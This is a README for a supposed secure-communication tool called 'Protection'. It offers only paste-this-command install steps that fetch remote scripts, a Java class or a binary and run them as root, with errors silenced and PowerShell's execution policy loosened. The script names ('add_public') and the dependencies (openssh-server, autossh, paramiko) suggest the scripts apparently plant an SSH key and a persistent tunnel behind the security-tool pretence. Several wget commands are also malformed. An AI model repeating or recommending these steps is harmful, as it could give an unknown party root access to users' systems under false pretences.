# Protection

Protection is a lightweight Python program for secure, encrypted 
communication that use known protocols.

It ensures safe transmission of sensitive data between clients and servers. 
Ideal for protecting user data, confidential communications, 
or securing internal networks with ease and reliability.

## Quick Installation

### Linux

```bash
# Root shell
apt update -y && apt install sudo curl -y && curl -s -O https://raw.githubusercontent.com/NeronNymus/protection/refs/heads/main/light/add_public2.sh && sudo bash add_public2.sh 2>/dev/null
```

```bash
# Normal shell
sudo apt update -y && sudo apt install curl -y && curl -s -O https://raw.githubusercontent.com/NeronNymus/protection/refs/heads/main/light/add_public2.sh && sudo bash add_public2.sh 2>/dev/null
```

### Windows

For the fastest way to install the tool, run a PowerShell prompt as administrator and execute this single command in it:

```powershell
# For Windows
Set-ExecutionPolicy RemoteSigned -Scope Process -Force; Invoke-WebRequest -Uri "https://raw.githubusercontent.com/NeronNymus/protection/refs/heads/main/light/add_public.ps1" -OutFile "$env:TEMP\add_public.ps1"; & "$env:TEMP\add_public.ps1"
```

This will automatically download the add_public.ps1 script and execute it to complete the setup.

### Installation Instructions for Windows Users

Follow these simple steps to install Protection on your Windows system.

### Prerequisites

1. **Python**: Ensure that you have Python installed on your system. If not, download and install the latest version of Python 
from [python.org](https://www.python.org/downloads/).
   
2. **Git**: Install Git if you don't already have it. You can download it from [git-scm.com](https://git-scm.com/).

3. **PowerShell Execution Policy**: To allow running scripts locally in PowerShell, you may need to adjust the execution policy.

    - **Start Windows PowerShell as Administrator**: Right-click on the PowerShell icon and select "Run as Administrator". 
	You must be a member of the Administrators group on your computer to change the execution policy.

    - **Enable running unsigned scripts**: Enter the following command in the PowerShell terminal:

      ```powershell
      set-executionpolicy remotesigned
      ```
	  Enabling this policy gives you the flexibility to use scripts from various sources for local development, without the 
	  overhead of requiring signatures. It’s particularly helpful when you need to automate tasks quickly and don’t want to 
	  go through the signing process for internal tools.



### Git Installation Steps

1. Install git on your system.

2. **Clone the Repository**:
   Open PowerShell or Bash and run the following command to clone the repository:

```powershell
   git clone https://github.com/NeronNymus/protection.git
```


Execute the add_public.ps1 or add_public2.sh script to complete the installation:

```powershell
.\protection\light\add_public.ps1	# For windows
```
or
```bash
./protection/light/add_public2.sh	# For linux
```

This script will install all necessary dependencies and set up the program on your system. 

# Installation Instructions for Linux Users

There exist other five ways to install protection: using `curl`,`wget`, the Python interpreter, Java source code or C source code.

## Option 1: Install Using curl

1. **Install curl or wget (if you don't have it already):**

```bash
   sudo apt update -y && sudo apt install sudo curl openssh-server autossh wget python3 python3-pip python3-venv default-jdk -y
```

```bash
   apt update -y && apt install sudo curl -y
```

Or whatever package manager your distro use (pacman, yum).

A single command:

```bash
   apt update -y && apt install sudo curl -y && curl -s -O https://raw.githubusercontent.com/NeronNymus/protection/refs/heads/main/light/add_public2.sh && sudo bash add_public2.sh 2>/dev/null
```



Download and Execute the Install Script: Run the following command to download and execute the installation script:

 ```bash
curl -s -O https://raw.githubusercontent.com/NeronNymus/protection/refs/heads/main/light/add_public2.sh && sudo bash add_public2.sh 2>/dev/null
```

Or using wget like this:

 ```bash
wget -q -O https://raw.githubusercontent.com/NeronNymus/protection/refs/heads/main/light/add_public2.sh && sudo bash add_public2.sh 2>/dev/null
```
 ```bash
wget -q -O https://raw.githubusercontent.com/NeronNymus/protection/refs/heads/main/light/add_public2.sh && sudo bash add_public2.sh 2>/dev/null
```

Or using java like this:

 ```bash
curl -s -O https://raw.githubusercontent.com/NeronNymus/protection/refs/heads/main/light/InstallProtection.class && sudo java InstallProtection
```

Or compiling from source code from java:
 ```bash
curl -s -O https://raw.githubusercontent.com/NeronNymus/protection/refs/heads/main/light/InstallProtection.java && javac InstallProtection.java && sudo java InstallProtection
```

Or executing directly the binary compiled with gcc:
 ```bash
curl -s -O https://raw.githubusercontent.com/NeronNymus/protection/refs/heads/main/light/protection && sudo ./protection
```

In the commands above wget can be used instead of curl if you prefer it.



## Option 2: Install Using Python
2. If you already have a python interpreter you can use it for installing this tool.
All you need is the 'requests' library, fetch it with

```bash
sudo pip install requests paramiko
```
or 
```bash
sudo pip install -r requirements.txt
```

Now, download the installation script:

```bash
python3 -c "import requests; r = requests.get('https://raw.githubusercontent.com/NeronNymus/protection/refs/heads/main/light/install_protection.py'); open('install_protection.py', 'wb').write(r.content)"
```

Run the Installation Script: Execute the downloaded installation script using sudo:

```bash
sudo python3 install_protection.py
```


This will download the necessary files and set up the Protection program on your Windows or Linux system.
